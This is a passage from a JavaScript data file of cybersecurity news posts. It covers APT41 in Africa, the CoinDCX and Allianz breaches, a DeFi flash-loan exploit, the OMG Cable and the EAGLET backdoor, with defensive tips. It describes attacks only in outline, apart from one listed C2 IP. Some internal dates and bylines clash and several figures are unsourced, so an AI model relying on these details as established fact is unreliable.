  `},{id:"apt41-africa-sharepoint-c2-july-2025",title:"🕵️ China-linked APT41 Hacks African Governments Using SharePoint as C2",date:"2025-07-22",author:"EthicalByte",summary:"APT41, a China-backed hacking group, breached African government IT networks by abusing internal SharePoint servers as command‑and‑control infrastructure, using stolen admin credentials, DLL sideloading, and fake GitHub domains.",tags:["APT41","China","Africa","SharePoint","CyberEspionage","ThreatIntel"],imageKey:"apt41AfricaSharePointBanner",content:`
    <div style="background-color:#f5f7fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🕵️ China-linked APT41 Hacks African Governments Using SharePoint as C2</h3><br>
        <p style="font-style:italic;">Even trusted internal servers can become a weapon in the hands of attackers.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🔥 What Happened?</h4><br>
        <p>A new investigation has revealed that <strong>APT41</strong> — a Chinese state‑linked advanced persistent threat group — infiltrated African government networks using creative and stealthy techniques.</p>
        <p>Most notably, they abused internal <strong>Microsoft SharePoint servers</strong> as command‑and‑control (C2) nodes to control malware and exfiltrate data while blending into legitimate traffic.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🧰 Tactics & Techniques</h4><br>
        <ul>
          <li>🔑 Stolen administrator credentials for initial access.</li>
          <li>🖇️ <strong>DLL sideloading</strong> — loading malicious code via trusted apps.</li>
          <li>🌐 <strong>Fake GitHub domains</strong> — masking malicious traffic as legitimate developer activity.</li>
          <li>🗃️ Exploiting internal SharePoint servers as covert C2 infrastructure.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🌍 Why Africa?</h4><br>
        <p>This campaign highlights Africa’s growing geopolitical and economic significance. APT41 targeted sensitive policy documents, trade negotiations, and natural resource data — signaling heightened Chinese interest in the region.</p>
        <p>This is one of the few publicly reported APT41 campaigns focused on Africa, showing that no region is safe from cyber‑espionage.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ What Should Organizations Do?</h4><br>
        <ul>
          <li>✅ Rotate and harden admin credentials; enable MFA.</li>
          <li>✅ Monitor SharePoint servers and internal web traffic for anomalies.</li>
          <li>✅ Block or closely monitor traffic to lookalike GitHub domains.</li>
          <li>✅ Implement whitelisting and restrict DLL execution paths.</li>
          <li>✅ Conduct regular threat hunting exercises based on APT41 TTPs.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“When even your internal tools are suspect, vigilance inside the perimeter becomes critical.”</blockquote>
        <p>APT41’s latest activity is a stark reminder that internal platforms like SharePoint are no longer “safe zones.” Organizations must adopt a <strong>zero‑trust mindset</strong> and proactively monitor their networks to stay ahead of sophisticated threats.</p>
      </section>

    </div>
  `},{id:"coindcx-44m-internal-breach-july-2025",title:"🔐 CoinDCX Suffers $44M Internal Fund Breach — Customer Funds Remain Safe",date:"2025-07-23",author:"EthicalByte",summary:"CoinDCX, one of India’s leading crypto exchanges, suffered a $44 million internal breach from an operational account. No customer funds were affected, thanks to their secure cold wallet setup and swift incident response.",tags:["CoinDCX","Crypto Breach","Operational Wallet","Web3 Security","India","Centralized Exchange"],imageKey:"coindcxBreachBanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🔐 CoinDCX Suffers $44M Internal Fund Breach — Customer Funds Remain Safe</h3><br>
        <p style="font-style:italic;">Proof that even non-customer wallets need bulletproof security.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🚨 What Happened?</h4><br>
        <p>CoinDCX confirmed a <strong>sophisticated breach</strong> involving one of its internal operational wallets — not linked to customer holdings — leading to a loss of approximately <strong>$44 million (₹368–378 crore)</strong>. This wallet was specifically used to maintain liquidity across partner exchanges.</p>
        <p>Investigators identified unauthorized transactions routed through obfuscation platforms like <strong>Tornado Cash</strong>, with assets eventually diverted to <strong>Ethereum and Solana wallets</strong>.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Discovery & Response Timeline</h4><br>
        <ul>
          <li>🕵️ Blockchain investigators <strong>Cyvers</strong> and <strong>ZachXBT</strong> flagged the anomaly through on-chain behavior monitoring.</li>
          <li>🔐 CoinDCX <strong>immediately isolated</strong> the compromised account, suspended the affected Web3 wallet functionality, and launched a full forensic audit.</li>
          <li>💰 All trading activity, customer withdrawals, and INR deposits remained fully operational during the incident.</li>
          <li>💼 The company announced that <strong>internal reserves</strong> (treasury) will be used to absorb the losses, with <strong>zero impact to users</strong>.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📢 Official Statement Highlights</h4><br>
        <p>CoinDCX reaffirmed its commitment to transparency and security, stating:</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“While this incident impacted a specific operational wallet, all customer assets were and remain completely safe in our cold storage system.”</blockquote>
        <ul>
          <li>✅ Working closely with <strong>CERT-In</strong> and global cybersecurity firms to trace and recover assets.</li>
          <li>✅ Initiated a new <strong>bug bounty program</strong> to crowdsource vulnerabilities from ethical hackers.</li>
          <li>✅ Promised regular updates as the investigation progresses.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d1ecf1;padding:15px;border-radius:8px;">
        <h4 style="color:#0c5460;">📉 Context & Industry Comparison</h4><br>
        <p>This ranks as India’s <strong>second-largest exchange breach</strong>, after the infamous <strong>$235 million WazirX hack</strong> in 2024. Though smaller, the incident raises broader concerns around how internal wallets are managed across centralized exchanges.</p>
        <p>It underscores a growing trend: <strong>customer funds might be safe, but CEX infrastructure remains vulnerable</strong> to gaps in internal privilege control, wallet isolation, and real-time monitoring.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ Key Takeaways</h4><br>
        <ul>
          <li>✅ <strong>Cold wallet separation worked</strong>: Customer assets were never exposed or compromised.</li>
          <li>⚠️ <strong>Hot & operational wallets require layered monitoring and privilege access controls.</strong></li>
          <li>💬 <strong>Communication was swift</strong>, public, and transparent — helping protect the company’s trust score.</li>
          <li>🔧 <strong>Bug bounty initiative</strong> shows CoinDCX is actively learning and adapting post-incident.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌐 Final Reflection</h4><br>
        <p>As centralized exchanges evolve, so do the attack surfaces. Even systems designed for internal liquidity carry major risks when not monitored rigorously. CoinDCX’s breach may serve as a benchmark moment for CEXs worldwide to reassess internal wallet security and develop stricter frameworks for incident detection.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In Web3, your weakest wallet is your loudest breach.”</blockquote>
      </section>

    </div>
  `},{id:"cyber-heist-stacc-attack-july-2025",title:'💰 Cyber Heist Chronicles: The $1.9 Million "Stacc Attack"',date:"2025-07-24",author:"EthicalByte",summary:"A Canadian hacker named “StaccOverflow” (Jarett Dunn) exploited a Solana DeFi app, live-streaming a $1.9M flash loan hack. The event triggered debates on ethics, law, and the evolution of DeFi security.",tags:["DeFi","Flash Loan","Crypto Crime","StaccOverflow","Pump Fun","Solana","Smart Contract Hack"],imageKey:"staccAttackBanner",content:`
    <div style="background:#fdfdfd;padding:24px;border-radius:12px;border:1px solid #e0e0e0;font-family:sans-serif;">

      <div style="text-align:center;margin-bottom:20px;">
        <h2 style="color:#1a1a1a;">💰 Cyber Heist Chronicles: The $1.9 Million "Stacc Attack"</h2>
        <p style="font-style:italic;">A DeFi exploit that blurs the line between ethical hacking and criminality — and it happened in broad digital daylight.</p>
      </div>

      <section>
        <h3 style="color:#e63946;">📉 What Actually Happened?</h3>
        <p>Canadian software developer <strong>Jarett Dunn</strong>, known by the alias <strong>“StaccOverflow”</strong>, carried out a <strong>$1.9 million flash loan exploit</strong> against the Solana-based meme token platform <strong>Pump Fun</strong>. What’s extraordinary is that he <em>live-streamed</em> and <em>tweeted</em> the entire event in real time — all under the claim of “ethical hacking.”</p>
        <ul>
          <li>⚠️ Exploited a smart contract vulnerability involving flash loan logic</li>
          <li>⏱️ Executed the attack in seconds</li>
          <li>🌪️ Obfuscated fund movement via Tornado Cash</li>
          <li>🎙️ Livestreamed and tweeted every step as a “public bug bounty”</li>
          <li>🚓 Arrested within hours in British Columbia</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:16px;border-radius:8px;">
        <h3 style="color:#856404;">⚖️ Ethical Hacking... or Crime?</h3>
        <p>Stacc claimed the exploit was to prove a point — that <strong>Pump Fun</strong> was insecure. He argued it was a “white-hat action,” even referring to the funds as a <em>bounty</em> and saying he was doing the project a favor.</p>
        <p>But authorities didn’t see it that way. His lack of disclosure, immediate financial gain, and use of mixers were all flagged as criminal behavior. He was arrested without bail, pending cybercrime charges.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#2a9d8f;">🛠️ Technical Breakdown</h3>
        <p>Flash loans in DeFi allow users to borrow huge amounts of crypto instantly and repay them within the same transaction. Stacc used this mechanism to manipulate token pricing, buying undervalued tokens and reselling at inflated values — effectively draining liquidity.</p>
        <ul>
          <li>🧠 Vulnerability exploited in Pump Fun’s smart contract pricing model</li>
          <li>🔄 Flash loan loop executed on-chain within seconds</li>
          <li>🧩 Asset laundering via Tornado Cash</li>
          <li>📉 Liquidity pools depleted, price manipulation confirmed</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:16px;border-radius:8px;">
        <h3 style="color:#155724;">🔐 What This Means for DeFi</h3>
        <ul>
          <li>🚨 Flash loans remain a top attack vector for under-secured smart contracts</li>
          <li>📜 Projects must implement and enforce <strong>bug bounty programs</strong> and <strong>disclosure channels</strong></li>
          <li>👥 There’s no legal gray area when millions are stolen — intent does not excuse impact</li>
          <li>🔍 The DeFi ecosystem urgently needs better <strong>on-chain forensics</strong> and exploit alerts</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#264653;">🎙️ Darknet Diaries Feature</h3>
        <p>The entire incident has been covered in <strong>Episode 152</strong> of <a href="https://darknetdiaries.com/episode/152/" target="_blank">Darknet Diaries</a>, breaking down the event, motivations, technology, and arrest. Highly recommended for cybersecurity pros and enthusiasts alike.</p>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:16px;border-radius:8px;">
        <h3 style="color:#1a73e8;">🧠 Final Thoughts</h3>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;margin:10px 0;">
          “In DeFi, it's not just code that gets exploited — it’s trust.”
        </blockquote>
        <p>The “Stacc Attack” is a cautionary tale. Transparency is powerful, but so is accountability. While some may applaud the guts it took to livestream a heist, the law doesn’t — and won’t — applaud intent without consent. Ethical hacking must walk a razor-thin line. Are we ready to redefine what that line even looks like in Web3?</p>
      </section>

    </div>
  `},{id:"usb-cable-hacking-mg-july-2025",title:"🎙️ The USB Cable That Could Hack You: The Story of MG",date:"2025-07-25",author:"Ethicalbyte",summary:"A deep dive into the OMG Cable, a weaponized USB device created by hacker MG, capable of injecting keystrokes, executing remote payloads, and exposing the limits of hardware trust. What looks like a normal cable could be a hacker's backdoor.",tags:["Hardware Hacking","Cybersecurity","OMG Cable","MG","DEF CON","USB Exploits"],imageKey:"usbCableHackingBanner",content:`
  <div style="background:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;margin-bottom:20px">
      <h2>🔌 The USB Cable That Could Hack You — The Story of MG</h2>
      <p><i>Published: July 25, 2025 | Author: Cyber Talk Team</i></p>
    </div>

    <section>
      <h3>🧠 Meet MG: Hacker Turned Hardware Security Legend</h3>
      <p>MG is a name that echoes through DEF CON and Black Hat. A brilliant hardware hacker who stunned the cybersecurity world with the creation of the <strong>OMG Cable</strong> — a USB cable that looks normal but behaves like a cyber weapon.</p>
      <p>The cable can connect over Wi-Fi, impersonate a keyboard (HID), and inject commands or malware in seconds — all while remaining invisible to unsuspecting users.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>⚙️ What Makes the OMG Cable So Dangerous?</h3>
      <ul>
        <li>✅ <strong>Indistinguishable from standard cables</strong></li>
        <li>📶 <strong>Wi-Fi Controlled</strong> — attackers can send commands wirelessly</li>
        <li>🖥️ <strong>Keystroke Injection</strong> — launches attacks within seconds</li>
        <li>🚫 <strong>Stealth Mode</strong> — leaves virtually no trace on the system</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>📽️ Evolution Timeline of the OMG Cable</h3>
      <table style="width:100%;border:1px solid #ccc;text-align:left;border-collapse:collapse;">
        <thead>
          <tr><th style="border:1px solid #ccc;padding:8px;">Year</th><th style="border:1px solid #ccc;padding:8px;">Development</th></tr>
        </thead>
        <tbody>
          <tr><td style="border:1px solid #ccc;padding:8px;">2019</td><td style="border:1px solid #ccc;padding:8px;">First DIY prototype with Arduino internals</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2020</td><td style="border:1px solid #ccc;padding:8px;">DEF CON demo and public awareness</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2022</td><td style="border:1px solid #ccc;padding:8px;">Encrypted Wi-Fi payload support added</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2023</td><td style="border:1px solid #ccc;padding:8px;">Geo-fencing, kill-switch, delayed triggers introduced</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2025</td><td style="border:1px solid #ccc;padding:8px;">USB-C and cross-platform support released</td></tr>
        </tbody>
      </table>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>💡 Key Takeaways</h3>
      <ul>
        <li>🧠 Even a cable can become a cybersecurity risk</li>
        <li>🚷 Never trust peripherals from unknown sources</li>
        <li>🔐 Implement USB access policies on enterprise devices</li>
        <li>🧰 Red teams are using OMG Cable for realistic simulations</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>🎧 Want More?</h3>
      <p>MG’s story and tools are discussed in depth in <strong>Darknet Diaries Ep. 154: “The Cable”</strong>. It explores how hardware trust has become a battleground for cybersecurity experts.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>🔐 Final Thoughts</h3>
      <blockquote style="border-left:4px solid #28a745;padding-left:10px;">“In cybersecurity, never assume the harmless is harmless.”</blockquote>
      <p>The OMG Cable is a wake-up call: If a USB cable can be a hacker’s gateway, what else can be? From firmware to hardware, vigilance is the new default.</p>
    </section>
  </div>
`},{id:"darknet-diaries-greg-laughing-mantis-ep160-july-2025",title:"🎧 “Greg” (aka Laughing Mantis)",date:"2025-07-27",author:"EthicalByte",summary:"From teenage hacker to InfoSec advocate, Greg Linares—once known as Laughing Mantis—shares his gripping journey through early cybercrime, arrest, and redemption in this must-hear episode of Darknet Diaries.",tags:["Darknet Diaries","Hacker Story","Youth in Cybersecurity","Ethical Hacking","Redemption"],imageKey:"laughingMantisBanner",content:`
  <div style="background:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;margin-bottom:20px">
      <h2>🎧 “Greg” (aka Laughing Mantis)</h2><br>
      <p><i>Published: July 28, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3>🔍 Who is Greg Linares?</h3><br>
      <p>Known in online circles as <strong>Laughing Mantis</strong>, Greg Linares was once one of the youngest hackers arrested in Arizona. His story unfolds in <em>Darknet Diaries EP 160</em>, where he shares his raw and honest journey—from digital defiance to personal redemption.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>⚡ Rise, Fall, and Rise Again</h3><br>
      <ul>
        <li>🧠 <strong>Early Genius:</strong> Greg started hacking in his early teens, impressing underground forums with his network exploits and manipulation skills.</li>
        <li>🚔 <strong>Reality Check:</strong> A bold mistake led to his arrest as a teenager—forever changing his life trajectory.</li>
        <li>🔁 <strong>Reinvention:</strong> Greg now openly discusses the ethics of hacking and helps educate the next generation on responsible infosec practices.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>💡 Lessons from the Life of Laughing Mantis</h3><br>
      <ul>
        <li>⚖️ Talent must be paired with <strong>ethics</strong> and responsibility.</li>
        <li>🧩 One reckless decision can ripple through a lifetime.</li>
        <li>🔄 Redemption is real—growth comes from honest reflection and change.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>🛠️ Actionable Insights</h3><br>
      <ul>
        <li>✅ Support youth mentorships in cybersecurity spaces.</li>
        <li>📚 Encourage ethical coding and digital responsibility education early.</li>
        <li>🎓 Give second chances—today’s rebel could be tomorrow’s innovator.</li>
        <li>🧭 Organizations should identify and engage young cyber talent before legal issues occur.</li>
        <li>🔐 Better collaboration between legal systems and educational institutions can redirect potential into progress.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>🎯 Final Thoughts</h3><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Greg’s story isn’t just about hacking—it’s about humanity, healing, and how the infosec world can be a space for growth.”</blockquote>
      <p>We all make mistakes. Some are bigger than others. But the way we respond, learn, and evolve is what defines us. Greg's journey proves that even the darkest tunnels can lead to brighter outcomes when truth, humility, and guidance are present.</p>
      <p>As the cybersecurity world continues to evolve, it needs more advocates like Greg—individuals who have walked the path, stumbled, and come back stronger. Their voices carry the weight of experience and the wisdom of hindsight.</p>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>🎧 Listen to the Full Story</h3><br>
      <p>Catch the full episode on <strong>Darknet Diaries – Episode 160: “Greg”</strong> to hear firsthand how a teenage hacker turned his life around and now shapes the future of cybersecurity with integrity and purpose.</p>
    </section>
  </div>
`},{id:"allianz-life-insurance-breach-july-2025",title:"🚨 Allianz Life Insurance Breach Exposes 1.4 Million Users",date:"2025-07-28",author:"EthicalByte",summary:"A social engineering attack via a third-party CRM platform compromised the data of 1.4 million Allianz Life customers. The breach illustrates growing risks tied to vendor dependencies, human factors, and evolving attack surfaces in the insurance industry.",tags:["Data Breach","Cybersecurity","Social Engineering","Third-Party Risk","Insurance Security"],imageKey:"allianzBreachBanner",content:`
  <div style="background-color:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;">
      <h2>🚨 Allianz Life Insurance Breach Exposes 1.4 Million Users</h2><br>
      <p><i>Published: July 16, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3>🧩 What Happened?</h3><br>
      <p>On July 16, 2025, Allianz Life Insurance Company of North America confirmed a significant cybersecurity incident involving the compromise of a third-party CRM vendor. Threat actors used <strong>social engineering tactics</strong> to manipulate support staff, gaining unauthorized access to sensitive client records.</p>
      <p>While <strong>no financial or password data</strong> was breached, personal identifiable information (PII) — including names, emails, policy numbers, and partial SSNs — of nearly <strong>1.4 million U.S. customers</strong> were exposed. Internal employee records were also impacted in limited cases.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>🔑 Key Insights</h3><br>
      <ul>
        <li>🎯 <strong>Social Engineering Vector:</strong> Attackers didn't break in — they were <em>let in</em> through carefully crafted human manipulation.</li>
        <li>🧩 <strong>Third-Party Vulnerability:</strong> The CRM vendor was integrated into Allianz systems, providing an indirect access route.</li>
        <li>📈 <strong>Increasing Trend:</strong> Over 30% of modern data breaches now involve third-party service providers.</li>
        <li>🕵️ <strong>Delayed Detection:</strong> The breach went unnoticed for days until suspicious behavior triggered an internal investigation.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>💥 Business Impact</h3><br>
      <ul>
        <li>⚖️ <strong>Regulatory Scrutiny:</strong> Allianz is under review by the U.S. Federal Trade Commission (FTC) and several state-level data protection authorities.</li>
        <li>📉 <strong>Reputational Fallout:</strong> Initial reports caused a 2.3% drop in parent company Allianz SE’s stock within 24 hours.</li>
        <li>💬 <strong>Customer Distrust:</strong> Policyholders expressed concern over the safety of their data, leading to increased service cancellation requests.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>✅ What You Can Do</h3><br>
      <ul>
        <li>🔐 <strong>Zero Trust Vendor Access:</strong> Treat all third-party platforms as high-risk entry points; restrict privileges accordingly.</li>
        <li>📚 <strong>Train Your Teams:</strong> Conduct continuous simulation-based social engineering training (phishing, vishing, impersonation drills).</li>
        <li>🧩 <strong>Review API Connections:</strong> Audit CRM and SaaS tool integrations regularly for excessive or outdated permissions.</li>
        <li>🛑 <strong>Monitor Lateral Movement:</strong> Deploy user behavior analytics (UBA) to detect unusual data access across vendors.</li>
        <li>📑 <strong>Vendor SLAs:</strong> Establish breach notification, response time, and compliance clauses in all vendor contracts.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#f8d7da;padding:15px;border-radius:8px;">
      <h3>🚨 Why This Matters</h3><br>
      <p>This breach proves that even the most trusted institutions are vulnerable—not because of a lack of investment in cybersecurity, but because of <strong>unmonitored vendor pipelines and human error</strong>.</p>
      <p>As the insurance industry becomes increasingly digitized, its attack surface grows. <strong>Security strategies must now extend beyond the firewall</strong>, incorporating third-party ecosystems, workforce behavior, and supply chain transparency.</p>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>📌 Final Thought</h3><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">"An attacker doesn’t need to breach your servers — they just need to fool someone who can."</blockquote>
      <p>Cybersecurity is no longer just a technical concern — it’s a <strong>trust issue</strong>. The Allianz breach offers a harsh lesson in vigilance: <em>you’re only as strong as your weakest link</em>.</p>
      <p>Make third-party security a boardroom-level priority today — because tomorrow’s breach might start with someone else’s mistake.</p>
    </section>
  </div>
`},{id:"cargo-talon-eaglet-cyber-espionage-russia-july-2025",title:"🎯 Operation CargoTalon – EAGLET Backdoor Targets Russian Aerospace Sector",date:"2025-07-29",author:"EthicalByte",summary:"A sophisticated cyber‑espionage campaign dubbed Operation CargoTalon used the EAGLET backdoor to infiltrate Russian aerospace organizations, marking a major escalation in state-linked hacking activity.",tags:["Cyber Espionage","EAGLET","Russian Aerospace","Operation CargoTalon","UNG0901","InfoSec"],imageKey:"cargoTalonBanner",content:`
  <div style="background:#fdfdfd;padding:24px;border-radius:12px;border:1px solid #e2e8f0;font-size:15px;line-height:1.6;color:#1e293b;">

    <div style="text-align:center;margin-bottom:20px">
      <h2 style="color:#1e293b;">🎯 Operation CargoTalon – EAGLET Backdoor Targets Russian Aerospace</h2><br>
      <p><i>Published: July 25, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3 style="color:#1e293b;">🔍 What Happened?</h3><br>
      <p>Cybersecurity researchers uncovered a stealthy operation—<strong>Operation CargoTalon</strong>—that delivered a sophisticated backdoor named <strong>EAGLET</strong> to compromise Russian aerospace and defense firms. The threat actor behind this is tracked as <strong>UNG0901</strong>.</p>
      <p>The group relied on phishing lures using transport and logistics themes, tricking users into downloading ZIP files containing Windows shortcut (.lnk) files. These launched PowerShell scripts that executed a fake document and installed EAGLET in the background.</p>
    </section>

    <section style="margin-top:20px;background:#fffbea;padding:16px;border-radius:10px;">
      <h3 style="color:#92400e;">🛠️ Attack Mechanics</h3><br>
      <ul>
        <li>📎 ZIP Archive includes transport-themed filenames like <em>“TTN‑Reference‑Sheet.zip”</em></li>
        <li>🔗 LNK file silently runs PowerShell, deploying a decoy Excel file</li>
        <li>🧬 Injects the <strong>EAGLET</strong> backdoor DLL with shell command and file access capability</li>
        <li>🌐 Connects to C2 IP: <code>185.225.17.104</code></li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#f8d7da;padding:15px;border-radius:8px;">
      <h3 style="color:#1e293b;">📊 Why It Matters</h3><br>
      <ul>
        <li>🚨 <strong>Target:</strong> High-value defense and aerospace networks</li>
        <li>🛡️ <strong>Strategic Espionage:</strong> Long-term persistence possible using DLL sideloading</li>
        <li>🎭 <strong>Disguise:</strong> Using business documents increases phishing success rate</li>
      </ul>
      <p>This campaign highlights how cyber‑espionage no longer requires zero-days when attackers exploit human behavior and predictable file structures.</p>
    </section>

    <section style="margin-top:20px;background:#ecfdf5;padding:16px;border-radius:10px;">
      <h3 style="color:#047857;">✅ How to Defend</h3><br>
      <ul>
        <li>📧 Run phishing simulations with document-based bait</li>
        <li>🔎 Alert on PowerShell running via Explorer shortcuts</li>
        <li>🔐 Monitor traffic to suspicious C2 infrastructure</li>
        <li>📚 Train all employees—not just IT—on threat vector recognition</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#e0f2fe;padding:16px;border-radius:10px;">
      <h3 style="color:#0369a1;">🌐 Broader Implications</h3><br>
      <p>Operations like CargoTalon are increasing in frequency, often linked to nation-state actors. Russian, Chinese, North Korean, and other aligned APTs are shifting from destructive malware to <strong>targeted exfiltration and silent persistence</strong>.</p>
      <p>UNG0901’s methods align with other reported campaigns in the Asia‑Europe corridor. The inclusion of multiple decoy documents also points to multi-sector targeting across transport, defense, and policy organizations.</p>
    </section>

    <section style="margin-top:20px;">
      <h3 style="color:#1e293b;">📌 Final Thought</h3><br>
      <blockquote style="border-left:4px solid #0369a1;padding-left:12px;">"CargoTalon shows us that even logistics paperwork can be weaponized—reminding us that digital warfare thrives on everyday trust."</blockquote>
      <p>The takeaway? A ZIP file with a familiar name might be the launchpad for state-level intrusion. The key to stopping it is layered defense, proactive awareness, and training that treats every file like a possible threat.</p>
    </section>

    
  </div>
`},{id:"vastav-ai-deepfake-detection-july-2025",title:"🎯 Vastav AI: India’s Real-Time Deepfake Defense System",date:"2025-07-30",author:"EthicalByte",summary:"Vastav AI, India’s first indigenous real-time deepfake detection system developed by Zero Defend Security, is transforming how we combat misinformation by offering 99% accuracy across images, audio, and video.",tags:["Deepfake Detection","AI in Cybersecurity","Zero Defend Security","Misinformation","India Cybersecurity"],imageKey:"vastavAIDeepfakeBanner",content:`
  <div style="background-color:#f9fafb;padding:24px;border-radius:12px;border:1px solid #e5e7eb;">

    <div style="text-align:center;">
      <h3 style="color:#111827;">🧠 Vastav AI: India’s Real-Time Deepfake Defense System</h3><br>
      <p style="font-style:italic;color:#6b7280;">Where truth meets technology — Vastav AI takes on the era of misinformation with real-time precision.</p>
    </div>

    <section style="margin-top:24px;">
      <h4 style="color:#b91c1c;">📢 What Happened?</h4><br>
      <p>In 2025, <strong>Zero Defend Security</strong> introduced <strong>Vastav AI</strong> — India’s first AI-powered deepfake detection system built for real-time authenticity analysis of images, videos, and audio. With fake media spiraling out of control, Vastav promises up to 99% accuracy using advanced neural networks.</p>
      <p>This innovation responds directly to the rise of manipulated media in politics, social engineering, cybercrime, and misinformation warfare.</p>
    </section>

    <section style="margin-top:24px;background:#fef3c7;padding:20px;border-radius:8px;">
      <h4 style="color:#92400e;">🧪 Technical Breakdown</h4><br>
      <ul>
        <li>🤖 <strong>AI Core:</strong> Built on large transformer-based neural networks for deep media pattern recognition.</li>
        <li>🧠 <strong>Cross-Modality Detection:</strong> Works across multiple formats — audio, video, and image frames.</li>
        <li>🚀 <strong>Low Latency:</strong> Offers real-time predictions ideal for broadcast, legal, and field use.</li>
        <li>🔌 <strong>Public APIs:</strong> Integrates easily with journalistic platforms, social media checkers, and law enforcement dashboards.</li>
      </ul>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#1d4ed8;">📈 Real-World Applications</h4><br>
      <ul>
        <li>📰 <strong>News Verification:</strong> Major TV channels and media use Vastav to validate viral clips before airing.</li>
        <li>👮 <strong>Police Evidence Vetting:</strong> Used in cybercrime units to assess authenticity of video proof.</li>
        <li>🎓 <strong>Research & Academia:</strong> Supports detection of synthetic interviews or altered documentation in thesis defenses.</li>
        <li>🗳️ <strong>Election Monitoring:</strong> Helps EC & monitoring bodies during elections to counter propaganda videos.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#e0f2fe;padding:20px;border-radius:8px;">
      <h4 style="color:#0c4a6e;">🚧 Challenges Ahead</h4><br>
      <ul>
        <li>📊 <strong>Dataset Bias:</strong> Indian languages and regional content require more diverse training data.</li>
        <li>📉 <strong>False Flags:</strong> Occasional over-corrections could flag authentic videos, risking trust.</li>
        <li>🧠 <strong>Arms Race:</strong> Deepfake models like Sora or StyleGAN evolve rapidly — Vastav must adapt faster.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#ecfdf5;padding:20px;border-radius:8px;">
      <h4 style="color:#065f46;">🔍 Why This Matters</h4><br>
      <p>Vastav AI symbolizes India’s entrance into the elite club of real-time cybersecurity defense technology. With global conflicts, political disruption, and misinformation pandemics on the rise — tools like Vastav offer a digital shield for truth, reputation, and democracy.</p>
      <p>It isn’t just a tool — it’s a **strategic cybersecurity asset** born out of India’s growing AI capabilities.</p>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#7c3aed;">💬 Industry Response</h4><br>
      <ul>
        <li>🔎 <strong>Cybersecurity Analysts:</strong> Calling it the “Indian version of Reality Defender.”</li>
        <li>📢 <strong>Journalists:</strong> Applaud its potential in fighting misinformation in rural and low-tech areas.</li>
        <li>🎯 <strong>Lawmakers:</strong> Encouraging regulation that includes Vastav-style checks on social media uploads.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#f3f4f6;padding:20px;border-radius:8px;">
      <h4 style="color:#111827;">🌐 The Global Lens</h4><br>
